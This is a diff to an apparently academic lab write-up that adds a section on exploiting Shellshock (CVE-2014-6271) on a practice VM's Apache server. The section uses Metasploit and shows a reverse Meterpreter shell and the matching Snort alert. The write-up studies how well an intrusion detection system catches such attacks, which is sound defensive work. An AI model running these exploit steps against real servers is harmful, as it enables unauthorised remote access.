@@ -412,6 +412,35 @@ snort detected the attack:
 [**] [1:2012887:2] ET POLICY HTTP POST contains pass= in cleartext [**] [Classification: Potential Corporate Privacy Violation] [Priority: 1] {TCP} 172.28.128.1:43547 -> 172.28.128.3:80
 ```
 
+## Identified Attack 4: Apache
+
+Although we have to do 3, with CUPS we could not get a stable shell, so we will try to do 4.
+
+In the nmap we saw that the port 80 was open with service **http** and version **Apache httpd 2.4.7**, after searching for exploits we can see that there are more than 100 exploits for apache, so searching on google yields us with the exploit `multi/http/apache_mod_cgi_bash_env_exec`. We perform the usual options and execute.
+
+```bash
+set RHOSTS 172.28.128.3
+exploit
+```
+
+```bash
+[*] Started reverse TCP handler on 192.168.0.104:4444 
+[*] Command Stager progress - 100.00% done (1092/1092 bytes)
+[*] Sending stage (1017704 bytes) to 192.168.0.104
+[*] Meterpreter session 17 opened (192.168.0.104:4444 -> 192.168.0.104:39530) at 2023-11-20 00:04:31 +0200
+
+meterpreter > getuid
+Server username: www-data
+```
+
+We got access to a meterpreter, the interesting thing is that if we list the files we can see that in the directory that we are there is a file called `hello_world.sh` which could be a script that is executed by some other service, so it would probably be possible to get a shell with root privileges from here.
+
+Snort detected the attack:
+
+```bash
+11/19-22:04:30.702047  [**] [1:2022028:1] ET WEB_SERVER Possible CVE-2014-6271 Attempt [**] [Classification: Attempted Administrator Privilege Gain] [Priority: 1] {TCP} 172.28.128.1:42371 -> 172.28.128.3:80
+```
+
 ## Missed Attack 1: PHPMyAdmin
 
 When we access the page `172.28.128.3` from the browser we can see that there is a phpmyadmin page, we can search for a exploit which we can use.
@@ -494,8 +523,6 @@ uid=1111(leia_organa) gid=100(users) groups=100(users),27(sudo)
 This is not detected by Snort.
 
 ## Missed Attack 2: UnrealIRCd
-
-Although we have to do 3, with CUPS we could not get a stable shell, so we will try to do 4.
 
 In the in depth nmap we saw that the port 6697 was open with service **irc** and version **UnrealIRCd**, so we perform a search on metasploit:
 
